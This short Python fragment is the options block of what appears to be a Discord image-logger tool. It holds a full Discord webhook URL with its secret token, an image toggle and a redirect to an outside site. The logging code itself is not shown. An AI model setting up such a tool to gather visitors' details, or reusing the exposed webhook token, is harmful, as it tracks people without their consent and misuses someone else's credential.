...
options = {
    "webhook": {
        "url": "https://discord.com/api/webhooks/1194873318269009982/iUkCef2YhCN5-hC5i1K2KNYF5LJIexty-z_ThZfHl07GAleFn9FkSBeJ-4XHgVoDCmCC",
    },
    "image": {
        "enabled": True,
    ...
    "url": {
         "enabled": True,
         "url-redirect": "https://trexmine.com/",
    },
}
